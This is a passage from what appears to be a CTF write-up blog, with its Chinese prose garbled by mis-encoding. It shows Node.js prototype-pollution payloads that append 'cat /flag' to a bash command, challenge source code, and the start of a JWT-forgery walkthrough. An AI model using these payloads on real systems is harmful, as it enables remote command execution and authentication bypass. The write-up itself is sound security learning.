<p>ä½†æ˜¯ï¼Œ<code>request.user</code>åœ¨æ‰§è¡Œ<code>merge</code>ä¹‹å‰å°±å·²ç»æœ‰<code>command</code>å€¼<code>[&quot;-c&quot;,&quot;id&quot;]</code>,æ‰€ä»¥ä½œä¸ºä¸€ä¸ªå·²ç»å­˜åœ¨çš„å‚æ•°ï¼Œå°±ç®—æ±¡æŸ“äº†å®ä½“ï¼Œå®ƒæŸ¥æ‰¾è°ƒç”¨æ—¶è¿˜æ˜¯ä¼šä»¥å®ƒè‡ªå·±å·²æœ‰çš„å€¼ä¸ºå…ˆï¼Œæ‰€ä»¥å¦‚ä¸‹å›¾</p>
</blockquote>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906122510728.png" alt="image-20230906122510728"></p>
<p>æˆ‘ä»¬ä»”ç»†æ‰§è¡Œå‘½ä»¤çš„ä»£ç ï¼Œå‘ç°å®ƒæ˜¯å°† <code>request.user.command</code>è¿™ä¸ªæ•°ç»„ç›´æ¥æ¥åˆ° <code>/bin/bash</code>åé¢</p>
<p>æ„é€ æˆ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="built_in">id</span></span><br></pre></td></tr></table></figure>

<p>è¿™ç§å‘½ä»¤ã€‚</p>
<p>ä½†æ˜¯çªç„¶æƒ³åˆ°ä¸€ç‚¹ï¼Œæ—¢ç„¶æ— æ³•ç›´æ¥æ±¡æŸ“å®ä½“ä¿®æ”¹å·²æœ‰å‚æ•°ï¼Œé‚£ä¹ˆå¦‚æœåœ¨commandæ•°ç»„ä¸­å†åŠ ä¸€ä¸ªé”®å€¼<code>2</code>ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å‘½ä»¤ï¼Œèƒ½å¦ä¹ŸæˆåŠŸæ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬æœ¬åœ°å¯ä»¥å…ˆæµ‹è¯•ä¸€ä¸‹ï¼Œ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://127.0.0.1:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;whoami&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;id&quot;]&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).text)</span><br></pre></td></tr></table></figure>

<p>åªçœ‹è°ƒè¯•ç»“æœï¼Œcommandæ•°ç»„çš„å˜åŒ–</p>
<p>å¼€å§‹éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå†åŠ ä¸Šè¿™é‡Œçš„commandæ•°ç»„ç¬¦åˆcheckUserçš„è¦æ±‚ï¼Œé€šè¿‡</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131218447.png" alt="image-20230906131218447"></p>
<p>å½“è¿è¡Œåˆ°keyä¸º<code>prototype</code>æ—¶ï¼Œ</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131333083.png" alt="image-20230906131333083"></p>
<p>å¯ä»¥çœ‹åˆ°<code>target</code>ï¼Œä¹Ÿå°±æ˜¯<code>request.user</code>ï¼Œä¹Ÿè·å¾—äº†ä¸€ä¸ªå±æ€§2ä¸”å€¼ä¸º<code>whoami</code>çš„ï¼Œè¯´æ˜æ±¡æŸ“æˆåŠŸ</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906131429139.png" alt="image-20230906131429139"></p>
<p>ç»§ç»­çœ‹å¯¹commandæ•°ç»„çš„å½±å“ï¼Œè™½ç„¶ä¸¤è€…<code>command</code>æ•°ç»„ä¸€æ ·ï¼Œä½†æ˜¯åé¢å°±ä¼šå‡ºç°åŒºåˆ«</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133038986.png" alt="image-20230906133038986"></p>
<p>å‘ç°åœ¨ä¸æ–­çš„<code>merge</code>åˆå¹¶æ—¶ï¼Œ<code>user</code>å’Œ<code>request.user</code>ä¸­ä¸¤è€…çš„æ•°ç»„ä¸­çš„<code>key</code>ä¹Ÿåœ¨æ¯”è¾ƒï¼Œä½†æ˜¯ç”±äºä¸¤è€…çš„<code>command</code>æ•°ç»„ä¸­æ˜¯å­—ç¬¦ä¸²ï¼Œå±äº<code>whileTypes</code>ï¼Œæ‰€ä»¥ä¼šç›´æ¥å°†<code>target[key] = source[key];</code>ï¼Œä¹Ÿå°±æ˜¯å°†<code>user</code>ä¸­å€¼èµ‹å€¼ç»™<code>request.user</code>ï¼Œä¹Ÿå°±æ˜¯ä¿®æ”¹<code>command</code>å€¼</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> whileTypes = [<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, <span class="string">&#x27;bigint&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;undefined&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> source[key]) &amp;&amp; !whileTypes.<span class="title function_">includes</span>(<span class="keyword">typeof</span> target[key]))&#123;</span><br><span class="line">            <span class="keyword">if</span>(key !== <span class="string">&#x27;__proto__&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    target[key] = source[key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>key=0</code>å’Œ<code>key=1</code>ä¸¤è€…éƒ½ä¸€æ ·éƒ½æ˜¯<code>-c</code>,<code>id</code>ï¼Œæ‰€ä»¥èµ‹å€¼æ²¡æœ‰å˜åŒ–</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906132428230.png" alt="image-20230906132428230"></p>
<p>å½“<code>key=2</code>æ—¶ï¼Œå› ä¸ºä¹‹å‰æ‰§è¡Œ<code>prototype</code>æ—¶ï¼Œä½¿å¾—<code>request.user</code>ä¹Ÿæœ‰å±æ€§2è¿™ä¸ªå€¼ï¼Œ</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906133910040.png" alt="image-20230906133910040"></p>
<p>è™½ç„¶è¿™ä¸ªå±æ€§2æ˜¯åœ¨Objectä¸­ï¼Œä½†æ˜¯æ˜¯åœ¨Arrayä¹‹ä¸Šï¼Œæ‰€ä»¥å³ä¾¿commandæ•°ç»„ä¸­æ²¡æœ‰key&#x3D;2ï¼Œä½†æ˜¯ä»ç„¶å°±ä¼šä»åŸå‹é“¾ä¸­å¯»æ‰¾ï¼Œæ‰€ä»¥å½“å†æ¬¡è¿è¡Œåˆ°<code>target[key] = source[key];</code>æ—¶ï¼Œå±æ€§2å°±è¢«å½“ä½œcommandçš„å±æ€§2ï¼Œèµ‹å€¼è¿›å»äº†</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134039538.png" alt="image-20230906134039538"></p>
<p>äºæ˜¯æœ€åæ‰§è¡Œå‘½ä»¤æ—¶å°±æ˜¯ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/bash -c <span class="built_in">id</span> <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>

<p>ç”±è¿™ä¸ªç°è±¡ä¾¿å¯ä»¥æ„é€ å‡º<code>payload</code>ï¼Œå¯ä»¥çœ‹åˆ°ä¾¿å¾—åˆ°flag{test}</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;2&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;,&quot;-i&quot;]&#125;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="title function_">print</span>(&#123;<span class="string">&quot;user&quot;</span>:user&#125;)</span><br><span class="line"><span class="title function_">print</span>(requests.<span class="title function_">post</span>(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).<span class="property">text</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906134555175.png" alt="image-20230906134555175"></p>
<p>å½“ç„¶è¿™åªæ˜¯ä¸€ä¸ªï¼ŒåŒç†ï¼Œæ—¢ç„¶é™åˆ¶commandæ•°ç»„ä¸­å…ƒç´ ä¸ªæ•°è¦å°äºç­‰äº2ï¼Œæ‰€ä»¥ä¸€ä¸ªä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"># <span class="attr">http</span>:<span class="comment">//172.28.31.86:3000/user</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://172.28.31.86:3000/user&quot;</span></span><br><span class="line">user=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;&#123;&quot;username&quot;:&quot;ttoc&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;1&quot;:&quot;cat /flag&quot;&#125;&#125;,&quot;command&quot;:[&quot;-c&quot;]&#125;&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="title function_">print</span>(&#123;<span class="string">&quot;user&quot;</span>:user&#125;)</span><br><span class="line"><span class="title function_">print</span>(requests.<span class="title function_">post</span>(url=url, json=&#123;<span class="string">&quot;user&quot;</span>: user&#125;).<span class="property">text</span>)</span><br></pre></td></tr></table></figure>

<p>ç»“æœåŒä¸Šï¼Œåªæ˜¯ä¸èƒ½è®©commandä¸ºç©ºå°±è¡Œï¼Œä¸ç„¶ä¼šæŠ¥é”™</p>
<hr>
<p>ç›´æ¥æµè§ˆå™¨<code>console</code>ï¼Œå±•ç¤ºä¹Ÿå¯ä»¥ç†è§£åŸç†</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160734249.png" alt="image-20230906160734249"></p>
<p>è¿™é‡Œçš„å±æ€§2å®é™…æ˜¯åœ¨commandå®ä½“ä¸­</p>
<p><img src="/post/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/image-20230906160836260.png" alt="image-20230906160836260"></p>
<h2 id="NoRCE"><a href="#NoRCE" class="headerlink" title="NoRCE"></a>NoRCE</h2>]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘2022-wp</title>
    <url>//post/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<p><code>éº»äº†ï¼Œæˆ‘ä¹Ÿæƒ³åœ¨æ¯”èµ›æ—¶è¾“å‡ºï¼Œè€Œä¸æ˜¯æ¯”èµ›å</code></p>
<span id="more"></span>

<h1 id="è¥¿æ¹–è®ºå‰‘2022"><a href="#è¥¿æ¹–è®ºå‰‘2022" class="headerlink" title="è¥¿æ¹–è®ºå‰‘2022"></a>è¥¿æ¹–è®ºå‰‘2022</h1><h2 id="real-ez-node"><a href="#real-ez-node" class="headerlink" title="real_ez_node"></a>real_ez_node</h2><p>å¯åŠ¨ç¯å¢ƒåé¡µé¢</p>
<p><img src="/post/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20230412201904728.png" alt="image-20230412201904728"></p>
<p>ejsçŒœæµ‹æ˜¯åŸå‹é“¾æ±¡æŸ“</p>
<p>åˆ†æä¸€ä¸‹ä»£ç </p>
<p><code>app.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> createError = <span class="built_in">require</span>(<span class="string">&#x27;http-errors&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">&#x27;morgan&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = <span class="built_in">require</span>(<span class="string">&#x27;./routes/index&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);<span class="comment">//è§£æ,ç”¨req.bodyè·å–postå‚æ•°</span></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">false</span>&#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  secret : <span class="string">&#x27;secret&#x27;</span>, <span class="comment">// å¯¹session id ç›¸å…³çš„cookie è¿›è¡Œç­¾å</span></span><br><span class="line">  resave : <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>, <span class="comment">// æ˜¯å¦ä¿å­˜æœªåˆå§‹åŒ–çš„ä¼šè¯</span></span><br><span class="line">  cookie : &#123;</span><br><span class="line">    maxAge : <span class="number">1000</span> * <span class="number">60</span> * <span class="number">3</span>, <span class="comment">// è®¾ç½® session çš„æœ‰æ•ˆæ—¶é—´ï¼Œå•ä½æ¯«ç§’</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;));</span><br><span class="line"><span class="comment">// view engine setup</span></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"><span class="comment">// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // è®¾ç½®ä½¿ç”¨ ejs æ¨¡æ¿å¼•æ“ </span></span><br><span class="line"><span class="comment">//   fs.readFile(filePath, (err, content) =&gt; &#123;</span></span><br><span class="line"><span class="comment">//       if (err) return callback(new Error(err))</span></span><br><span class="line"><span class="comment">//       let compiled = lodash.template(content)    // ä½¿ç”¨ lodash.template åˆ›å»ºä¸€ä¸ªé¢„ç¼–è¯‘æ¨¡æ¿æ–¹æ³•ä¾›åé¢ä½¿ç”¨</span></span><br><span class="line"><span class="comment">//       let rendered = compiled()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//       return callback(null, rendered)</span></span><br><span class="line"><span class="comment">//   &#125;)</span></span><br><span class="line"><span class="comment">// &#125;);</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">logger</span>(<span class="string">&#x27;dev&#x27;</span>));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, index);</span><br><span class="line"><span class="comment">// app.use(&#x27;/challenge7&#x27;, challenge7);</span></span><br><span class="line"><span class="comment">// catch 404 and forward to error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// error handler</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">err, req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// set locals, only providing error in development</span></span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">message</span> = err.<span class="property">message</span>;</span><br><span class="line">  res.<span class="property">locals</span>.<span class="property">error</span> = req.<span class="property">app</span>.<span class="title function_">get</span>(<span class="string">&#x27;env&#x27;</span>) === <span class="string">&#x27;development&#x27;</span> ? err : &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render the error page</span></span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">status</span> || <span class="number">500</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = app;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>route/index.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> safeobj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">q</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;get q&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/copy&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-type&#x27;</span>,<span class="string">&#x27;text/html;charset=utf-8&#x27;</span>)</span><br><span class="line">  <span class="keyword">var</span> ip = req.<span class="property">connection</span>.<span class="property">remoteAddress</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(ip);</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;</span><br><span class="line">      <span class="attr">msg</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!ip.<span class="title function_">includes</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>)) &#123;</span><br><span class="line">      obj.<span class="property">msg</span>=<span class="string">&quot;only for admin&quot;</span></span><br><span class="line">      res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line">      <span class="keyword">return</span> </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">in</span> req.<span class="property">body</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(!index.<span class="title function_">includes</span>(<span class="string">&quot;__proto__&quot;</span>))&#123;</span><br><span class="line">          safeobj.<span class="title function_">expand</span>(user, index, req.<span class="property">body</span>[index])</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/curl&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> q = req.<span class="property">query</span>.<span class="property">q</span>;</span><br><span class="line">    <span class="keyword">var</span> resp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (q) &#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://localhost:3000/?q=&#x27;</span> + q</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                http.<span class="title function_">get</span>(url,<span class="function">(<span class="params">res1</span>)=&gt;</span>&#123;</span><br><span class="line">                    <span class="keyword">const</span> &#123; statusCode &#125; = res1;</span><br><span class="line">                    <span class="keyword">const</span> contentType = res1.<span class="property">headers</span>[<span class="string">&#x27;content-type&#x27;</span>];</span><br><span class="line">                  </span><br><span class="line">                    <span class="keyword">let</span> error;</span><br><span class="line">                    <span class="comment">// ä»»ä½• 2xx çŠ¶æ€ç éƒ½è¡¨ç¤ºæˆåŠŸå“åº”ï¼Œä½†è¿™é‡Œåªæ£€æŸ¥ 200ã€‚</span></span><br><span class="line">                    <span class="keyword">if</span> (statusCode !== <span class="number">200</span>) &#123;</span><br><span class="line">                      error = <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;Request Failed.\n&#x27;</span> +</span><br><span class="line">                                        <span class="string">`Status Code: <span class="subst">$&#123;statusCode&#125;</span>`</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                      <span class="variable language_">console</span>.<span class="title function_">error</span>(error.<span class="property">message</span>);</span><br><span class="line">                      <span class="comment">// æ¶ˆè´¹å“åº”æ•°æ®ä»¥é‡Šæ”¾å†…å­˜</span></span><br><span class="line">                      res1.<span class="title function_">resume</span>();</span><br><span class="line">                      <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  </span><br><span class="line">                    res1.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">                    <span class="keyword">let</span> rawData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123; rawData += chunk;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">&#x27;request success&#x27;</span>) &#125;);</span><br><span class="line">                    res1.<span class="title function_">on</span>(<span class="string">&#x27;end&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">                      <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">const</span> parsedData = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(rawData);</span><br><span class="line">                        res.<span class="title function_">end</span>(parsedData+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                        res.<span class="title function_">end</span>(e.<span class="property">message</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                  &#125;).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">                    res.<span class="title function_">end</span>(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">                  &#125;)</span><br><span class="line">                res.<span class="title function_">end</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">                res.<span class="title function_">end</span>(error+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä»<code>app.js</code>ä¸­çœ‹å‡ºæ˜¯åˆ©ç”¨</p>
</blockquote>
]]></content>
      <categories>
        <category>ç½‘ç»œå®‰å…¨å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>2023(æ˜Ÿ)CTF</title>
    <url>//post/2023(%E6%98%9F)CTF/</url>
    <content><![CDATA[<p><code>å’‹åªæœ‰ä¸€é“webï¼Œå…¨æ˜¯aié¢˜</code></p>
<span id="more"></span>

<h1 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h1><p>çœ‹é¢˜ç›®çŒœæµ‹è€ƒç‚¹æ˜¯<code>jwtä¼ªé€ +s2æ¼æ´</code></p>
<p>è¿›å…¥ç½‘ç«™ï¼Œå‘ç°æ˜¯éœ€è¦adminèº«ä»½ï¼Œä¹Ÿç¡®å®æ˜¯jwtä¼ªé€ </p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731095441281.png" alt="image-20230731095441281"></p>
<h2 id="è§£æjwt"><a href="#è§£æjwt" class="headerlink" title="è§£æjwt"></a>è§£æjwt</h2><p>ç”¨<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>è¿›è¡Œè§£æï¼Œå‘ç°ç¡®å®æ˜¯jwt</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731142627322.png" alt="image-20230731142627322"></p>
<p>ä½†æ˜¯ä¸çŸ¥é“å¯†é’¥ï¼Œ</p>
<p>å…ˆå°è¯•æ˜¯ä¸æ˜¯ç©ºå¯†é’¥ï¼Œç›´æ¥ä¿®æ”¹ä¸ºadmin</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731155151954.png" alt="image-20230731155151954"></p>
<p>å¾—åˆ°æ–°çš„<code>jwt</code></p>
<blockquote>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjM5MzI5N30.L0YCThgRESeqIu8mUgr_IjD6CYadVNFH4sQ29w40nnU</p>
</blockquote>
<p>ä»£å…¥å†æ¬¡è®¿é—®ç½‘ç«™</p>
<p>ç»“æœæç¤º<code>token</code>æ— æ•ˆï¼Œ</p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731155331700.png" alt="image-20230731155331700"></p>
<p>æŸ¥çœ‹ç½‘é¡µæºç å‘ç°</p>
<p>æç¤º<code>JWT_key.php</code></p>
<p><img src="/post/2023(%E6%98%9F)CTF/image-20230731155922977.png" alt="image-20230731155922977"></p>
<p>è¿™åº”è¯¥å°±æ˜¯jwtç”Ÿæˆå’Œèº«ä»½éªŒè¯çš„phpä»£ç </p>
<p>è®¿é—®å¾—åˆ°ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 